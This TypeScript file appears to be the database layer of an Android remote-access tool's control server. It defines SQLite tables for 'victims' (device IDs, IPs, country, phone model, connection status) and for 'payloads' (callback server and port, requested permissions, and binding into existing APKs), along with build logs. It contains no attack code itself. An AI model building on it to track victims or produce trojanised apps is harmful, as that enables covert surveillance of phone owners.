import { resolve } from 'path';
import {
    type Association,
    type CreationOptional,
    DataTypes,
    type ForeignKey,
    type HasManyAddAssociationMixin,
    type HasManyAddAssociationsMixin,
    type HasManyCountAssociationsMixin,
    type HasManyCreateAssociationMixin,
    type HasManyGetAssociationsMixin,
    type HasManyHasAssociationMixin,
    type HasManyHasAssociationsMixin,
    type HasManyRemoveAssociationMixin,
    type HasManyRemoveAssociationsMixin,
    type HasManySetAssociationsMixin,
    type InferAttributes,
    type InferCreationAttributes,
    Model,
    type NonAttribute,
    Sequelize,
} from 'sequelize';
import Container from 'typedi';

import {
    BindingMethod,
    PackagingMode,
    PayloadLogStatus,
    PayloadStatus,
    type VictimOrder,
    VictimStatus,
} from '../common/enums';
import {
    type IPayloadLogModel,
    type IPayloadModel,
    type IVictimModel,
} from '../common/interfaces';
import { config } from './config';
import { logger } from './logger';

const sequelize = new Sequelize({
    dialect: 'sqlite',
    storage: resolve(process.cwd(), config.SQLITE_FILE),
    logging(sql) {
        logger.verbose(sql, {
            label: 'database',
            action: 'query',
        });
    },
});

Container.set(Sequelize, sequelize);

export class VictimModel
    extends Model<
        InferAttributes<VictimModel>,
        InferCreationAttributes<VictimModel>
    >
    implements IVictimModel
{
    public declare id: CreationOptional<string>;
    public declare deviceId: string;
    public declare ip: string;
    public declare port: number;
    public declare country: string;
    public declare manf: string;
    public declare model: string;
    public declare release: string;
    public declare status: VictimStatus;
    public declare createdAt: CreationOptional<number>;
    public declare updatedAt: CreationOptional<number>;
}

VictimModel.init(
    {
        id: {
            type: DataTypes.UUID,
            primaryKey: true,
            defaultValue: DataTypes.UUIDV4,
        },
        deviceId: {
            type: DataTypes.STRING,
            allowNull: false,
            unique: true,
        },
        ip: {
            type: DataTypes.STRING,
            allowNull: false,
        },
        port: {
            type: DataTypes.INTEGER,
            allowNull: false,
        },
        country: {
            type: DataTypes.STRING,
            allowNull: false,
        },
        manf: {
            type: DataTypes.STRING,
            allowNull: false,
        },
        model: {
            type: DataTypes.STRING,
            allowNull: false,
        },
        release: {
            type: DataTypes.STRING,
            allowNull: false,
        },
        status: {
            type: DataTypes.ENUM,
            values: Object.values(VictimStatus),
            allowNull: false,
            defaultValue: VictimStatus.DISCONNECTED,
        },
        createdAt: {
            type: DataTypes.BIGINT,
            allowNull: false,
            defaultValue: () => Date.now(),
        },
        updatedAt: {
            type: DataTypes.BIGINT,
            allowNull: false,
            defaultValue: () => Date.now(),
        },
    },
    {
        sequelize,
        tableName: 'victims',
        timestamps: false,
        hooks: {
            beforeCreate: (victim: VictimModel) => {
                victim.createdAt = victim.updatedAt = Date.now();
            },
            beforeUpdate: (victim: VictimModel) => {
                victim.updatedAt = Date.now();
            },
        },
    },
);

export class PayloadLogModel
    extends Model<
        InferAttributes<PayloadLogModel>,
        InferCreationAttributes<PayloadLogModel>
    >
    implements IPayloadLogModel
{
    public declare id: CreationOptional<string>;
    public declare status: PayloadLogStatus;
    public declare message: string;
    public declare error?: string | undefined;
    public declare createdAt: CreationOptional<number>;
    public declare updatedAt: CreationOptional<number>;

    public declare payloadId: ForeignKey<PayloadModel['id']>;

    public declare payload?: NonAttribute<PayloadModel>;
}

PayloadLogModel.init(
    {
        id: {
            type: DataTypes.UUID,
            primaryKey: true,
            defaultValue: DataTypes.UUIDV4,
        },
        status: {
            type: DataTypes.ENUM,
            values: Object.values(PayloadLogStatus),
            allowNull: false,
        },
        message: {
            type: DataTypes.STRING,
            allowNull: false,
        },
        error: {
            type: DataTypes.STRING,
            allowNull: true,
        },
        createdAt: {
            type: DataTypes.BIGINT,
            allowNull: false,
            defaultValue: () => Date.now(),
        },
        updatedAt: {
            type: DataTypes.BIGINT,
            allowNull: false,
            defaultValue: () => Date.now(),
        },
    },
    {
        sequelize,
        tableName: 'payload_logs',
        timestamps: false,
        hooks: {
            beforeCreate: (log: PayloadLogModel) => {
                log.createdAt = log.updatedAt = Date.now();
            },
            beforeUpdate: (log: PayloadLogModel) => {
                log.updatedAt = Date.now();
            },
        },
    },
);

export class PayloadModel
    extends Model<
        InferAttributes<PayloadModel, { omit: 'logs' }>,
        InferCreationAttributes<PayloadModel, { omit: 'logs' }>
    >
    implements IPayloadModel
{
    public declare id: CreationOptional<string>;
    public declare existingAPKName?: string;
    public declare status: PayloadStatus;
    public declare server: string;
    public declare port: number;
    public declare permissions: VictimOrder[];
    public declare packagingMode: PackagingMode;
    public declare bindingMethod: BindingMethod;
    public declare createdAt: CreationOptional<number>;
    public declare updatedAt: CreationOptional<number>;

    public declare logs: NonAttribute<PayloadLogModel[]>;

    declare getLogs: HasManyGetAssociationsMixin<PayloadLogModel>; // Note the null assertions!
    declare addLog: HasManyAddAssociationMixin<PayloadLogModel, number>;
    declare addLogs: HasManyAddAssociationsMixin<PayloadLogModel, number>;
    declare setLogs: HasManySetAssociationsMixin<PayloadLogModel, number>;
    declare removeLog: HasManyRemoveAssociationMixin<PayloadLogModel, number>;
    declare removeLogs: HasManyRemoveAssociationsMixin<PayloadLogModel, number>;
    declare hasLog: HasManyHasAssociationMixin<PayloadLogModel, number>;
    declare hasLogs: HasManyHasAssociationsMixin<PayloadLogModel, number>;
    declare countLogs: HasManyCountAssociationsMixin;
    declare createLog: HasManyCreateAssociationMixin<
        PayloadLogModel,
        'payloadId'
    >;

    declare static associations: {
        logs: Association<PayloadModel, PayloadLogModel>;
    };
}

PayloadModel.init(
    {
        id: {
            type: DataTypes.UUID,
            primaryKey: true,
            defaultValue: DataTypes.UUIDV4,
        },
        existingAPKName: {
            type: DataTypes.STRING,
            allowNull: true,
        },
        status: {
            type: DataTypes.ENUM,
            values: Object.values(PayloadStatus),
            allowNull: false,
            defaultValue: PayloadStatus.PENDING,
        },
        server: {
            type: DataTypes.STRING,
            allowNull: false,
        },
        port: {
            type: DataTypes.INTEGER,
            allowNull: false,
        },
        permissions: {
            type: DataTypes.STRING,
            allowNull: false,
            get() {
                const rawValue = this.getDataValue(
                    'permissions',
                ) as unknown as string;
                return rawValue ? rawValue.split(',') : [];
            },
            set(value: VictimOrder[]) {
                this.setDataValue(
                    'permissions',
                    (Array.isArray(value)
                        ? value.join(',')
                        : '') as unknown as VictimOrder[],
                );
            },
        },
        packagingMode: {
            type: DataTypes.ENUM,
            values: Object.values(PackagingMode),
            allowNull: false,
        },
        bindingMethod: {
            type: DataTypes.ENUM,
            values: Object.values(BindingMethod),
            allowNull: false,
        },
        createdAt: {
            type: DataTypes.BIGINT,
            allowNull: false,
            defaultValue: () => Date.now(),
        },
        updatedAt: {
            type: DataTypes.BIGINT,
            allowNull: false,
            defaultValue: () => Date.now(),
        },
    },
    {
        sequelize,
        tableName: 'payloads',
        timestamps: false,
        hooks: {
            beforeCreate: (payload: PayloadModel) => {
                payload.createdAt = payload.updatedAt = Date.now();
            },
            beforeUpdate: (payload: PayloadModel) => {
                payload.updatedAt = Date.now();
            },
        },
        defaultScope: {
            include: 'logs',
        },
    },
);

PayloadLogModel.belongsTo(PayloadModel, {
    foreignKey: 'payloadId',
    as: 'payload',
});

PayloadModel.hasMany(PayloadLogModel, {
    foreignKey: 'payloadId',
    sourceKey: 'id',
    as: 'logs',
    onDelete: 'CASCADE',
    onUpdate: 'CASCADE',
});

export const setupDatabase = async (): Promise<Sequelize | null> => {
    try {
        logger.verbose('Setting up database...', {
            label: 'server',
            action: 'start',
        });

        await sequelize.authenticate();

        await sequelize.sync();

        logger.info('Database setup complete!', {
            label: 'server',
            action: 'start',
        });

        return sequelize;
    } catch (error) {
        logger.error('Database setup failed!', {
            label: 'server',
            action: 'start',
            error,
        });
    }

    return null;
};
